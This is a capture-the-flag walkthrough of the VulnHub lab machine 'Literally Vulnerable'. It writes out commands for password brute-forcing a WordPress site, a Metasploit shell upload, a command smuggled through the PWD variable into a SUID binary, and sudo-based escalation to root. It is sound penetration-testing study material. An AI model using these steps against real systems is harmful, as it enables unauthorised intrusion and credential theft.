---
title: "Literally Vulnerable"
date: 2020-08-02
layout: "writeup"
difficulty: "Medium"
excerpt: "Walkthrough for Literally Vulnerable on VulnHub"
os: "Linux"
platform: "VulnHub"
tags: [website enumeration, anonymous ftp, privilege escalation, VulnHub]
comments: false
---

Literally Vulnerable is an easy to medium difficulty OSCP style box from [VulnHub](https://www.vulnhub.com). Below are the steps taken to compromise this box.

First, I enumerated open ports with `threader3000`.

![Literally Vulnerable threader3000](/images/LiterallyVulnerable1.png)

Next, I ran `nmap -A -p 21,22,80,65535 [machine ip]` to enumerate the ports to find out more details about what services were running on them.

![Literally Vulnerable nmap](/images/LiterallyVulnerable2.png)

It appears that there is an FTP server available with anonymous access, 2 HTTP servers on ports 80 and 65535, and SSH open. Let's take a look at the FTP server first. Let's run `ftp [machine ip]` and enter in the username of **anonymous** when prompted. Once connected, run `ls` and you will see a file called **backupPasswords**. Let's run `get backupPasswords` to save this file to our attacker pc.

![Literally Vulnerable ftp](/images/LiterallyVulnerable3.png)

Let's terminate the ftp connection and run `cat backupPasswords` to see what is in the file.

![Literally Vulnerable backupPasswords](/images/LiterallyVulnerable4.png)

It appears that this contains a list of passwords for something. Let's take a look at the website on port 80 to start with.

![Literally Vulnerable website port 80](/images/LiterallyVulnerable5.png)

It appears that this is a WordPress site, but it didn't load properly. Looking at the links, it is looking for a website named **literally.vulnerable**. Let's run `echo "[machine ip] literally.vulnerable" >> /etc/hosts`.

![Literally Vulnerable update /etc/hosts](/images/LiterallyVulnerable6.png)

Let's reload the website and see if it loads properly.

![Literally Vulnerable Wordpress site fixed](/images/LiterallyVulnerable7.png)

This looks much better. I went to the Wordpress login link at the bottom of the page and tried using the username of **doe** on the login page, but it appeared that user didn't exist. I then tried with admin and used all the passwords in the **backupPassword** file, but none of them worked. I next took a look at the website on port 65535.

![Literally Vulnerable port 65535 website](/images/LiterallyVulnerable8.png)

This appears to be a default configuration of Apache2. Let's run `gobuster dir -u http://literally.vulnerable:65535/ -w /usr/share/wordlists/dirb/big.txt -x .php,.txt -t 50`. It appears that there is a directory called **/phpcms**. Let's take a look at it.

![Literally Vulnerable gobuster port 65535](/images/LiterallyVulnerable9.png)

It appears that this site has a password protected post by a user named **notadmin**. 

![Literally Vulnerable Wordpress](/images/LiterallyVulnerable10.png)

I scrolled down and went to the login page. We know one of the user login names is **notadmin** based on who is posting. Let's see what we can find with **wpscan** for this site. Let's run `wpscan --url http://literally.vulnerable:65535/phpcms/ --enumerate`. This ends up returning 2 users, **maybeadmin** and **notadmin**.

![Literally Vulnerable wpscan 65535](/images/LiterallyVulnerable11.png)

Let's try to crack one of these users with the passwords list we obtained earlier with `wpscan --url http://literally.vulnerable:65535/phpcms/ --usernames maybeadmin, notadmin --passwords backupPasswords`. After a few moments, we will crack the password for maybeadmin

![Literally Vulnerable maybeadmin password](/images/LiterallyVulnerable12.png)

Let's navigate to **http://literally.vulnerable:65535/phpcms/wp-login.php** and attempt to login with the username **maybeadmin** and the password you just uncovered for this user.

![Literally Vulnerable WordPress dashboard](/images/LiterallyVulnerable13.png)

Success! Let's see what information we can uncover. Let's take a look at the secure post we didn't have access to at the beginning. Click on **Posts** on the left hand menu and then you should be able to click on **Secure Post**

![Literally Vulnerable Secure Post](/images/LiterallyVulnerable14.png)

This provides you with the credentials for **notadmin**. 

![Literally Vulnerable notadmin](/images/LiterallyVulnerable15.png)

Let's login with this user's credentials, as we are not able to edit themes or add in/modify plugins as maybeadmin.

![Literally Vulnerable notadmin login](/images/LiterallyVulnerable16.png)

Awesome **notadmin** is the admin to this WordPress site. Let's click on **Appearance** followed by **Theme Editor** so we can modify a PHP page with a reverse shell.

![Literally Vulnerable theme editor](/images/LiterallyVulnerable17.png)

Next, on the right hand side, click on **404 Template** so we can paste in the reverse shell from [PenTestMonkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell). Make sure to modify the IP address and port to match what you want to use on your attacker PC. Once finished, click on **Update File**.

![Literally Vulnerable PHP reverse shell](/images/LiterallyVulnerable18.png)

Unfortunately, this results in an error message and we aren't able to save the changes to the PHP file. 

![Literally Vulnerable update failed](/images/LiterallyVulnerable19.png)

Let's see if there's a MetaSploit module we can use instead. Let's launch metasploit with `msfconsole` and then run `search wp_admin`.

![Literally Vulnerable msfconsole](/images/LiterallyVulnerable20.png)

Let's attempt this exploit with `use exploit/unix/webapp/wp_admin_shell_upload` and then run `show options`

![Literally Vulnerable msfconsole2](/images/LiterallyVulnerable21.png)

Let's use `set PASSWORD [password from wpscan], set USERNAME notadmin, set TARGETURI /phpcms/, set RHOSTS [machine ip], set RPORT 65535` and run `show options` again to confirm all the options are set.

![Literally Vulnerable msfconsole3](/images/LiterallyVulnerable22.png)

Once entered, type in `exploit` and press enter to start the exploit. You will soon get a meterpreter connection. Let's run `shell` to get to a shell and run `whoami` to see who we are logged in as.

![Literally Vulnerable meterpreter shell](/images/LiterallyVulnerable23.png)

Let's see if we can upgrade our shell. After some trial and error it appears that python3 is installed, and we can get a shell with `python3 -c 'import pty; pty.spawn("/bin/sh")'`. Next, I navigated to the user home directory with `cd /home` and ran `ls` to see what was present there. It appears there are two users, **doe** and **john**. Let's go to doe's home directory with `cd doe`. The first flag is here, but we aren't able to read it. There's also a noteFromAdmin and an executable named **itseasy** that is a SUID that runs as the user **john**.

![Literally Vulnerable doe home folder](/images/LiterallyVulnerable24.png)

Let's run the program with `./itseasy`. It appears to print the user's home directory, which is typically stored in the **$PWD** environmental variable. 

![Literally Vulnerable itseasy](/images/LiterallyVulnerable25.png)

Let's modify the PWD variable to run bash instead with `export PWD=';/bin/bash'`. This will change this variable to execute a bash shell. Let's run `./itseasy`. You should now have a shell as john.

![Literally Vulnerable john shell](/images/LiterallyVulnerable27.png)

Let's navigate to john's home directory with `cd /home/john` and run `ls -al` to see what's there. The user.txt file is present here, which can be viewed with `cat user.txt`.

![Literally Vulnerable user.txt](/images/LiterallyVulnerable28.png)

At this point, I wanted to see if I could find any files that john owned throughout the victim machine, so I ran `find / -group john 2>/dev/null` which will eliminate any error messages and return only the files john has access to.

![Literally Vulnerable john owned files](/images/LiterallyVulnerable29.png)

One stood out, **/home/john/.local/share/tmpFiles/myPassword**. Let's run `cat /home/john/.local/share/tmpFiles/myPassword`. This provides you with a note stating that john's password is encoded in base64. 

![Literally Vulnerable myPassword](/images/LiterallyVulnerable30.png)

Let's run `echo "[base64 encoded password]"\|base64 -d`. This should provide you with john's credentials:

![](/images/LiterallyVulnerable31.png)

Let's open a new terminal window on our attacker pc and run `ssh john@[machine.ip]` and enter the password that was just decoded.

![Literally Vulnerable SSH](/images/LiterallyVulnerable32.png)

Let's run `sudo -l` and we see that john can run **/var/www/html/test.html** as root

![Literally Vulnerable sudo -l](/images/LiterallyVulnerable33.png)

Let's navigate to that folder with `cd /var/www/html` and run `touch test.html`. Unfortunately, we are not able to create this file here with john.

![Literally Vulnerable Permission denied](/images/LiterallyVulnerable34.png)

However, this is under a folder that www-data has access to. Let's go back to the other terminal window and type `exit` to leave the shell as john and go back to the **www-data** user.

![Literally Vulnerable www-data](/images/LiterallyVulnerable35.png)

Let's run `touch /var/www/html/test.html` and see what happens

![Literally Vulnerable touch test.html](/images/LiterallyVulnerable36.png)

Success! Let's run `echo "/bin/bash" >> /var/www/html/test.html` and `chmod +x /var/www/html/test.html`.

![Literally Vulnerable update test.html](/images/LiterallyVulnerable37.png)

This will allow it to run a bash shell as root since it is now executable. Next, go back to your SSH session as john and run `sudo ./test.html`. You should now have a root shell!

![Literally Vulnerable root shell](/images/LiterallyVulnerable38.png)

Now, we can run `cd /root` followed by `ls` and `cat root.txt` to get the root flag. We can also run `cat /home/doe/local.txt` to get the local.txt flag from earlier.

![Literally Vulnerable root.txt local.txt](/images/LiterallyVulnerable39.png)
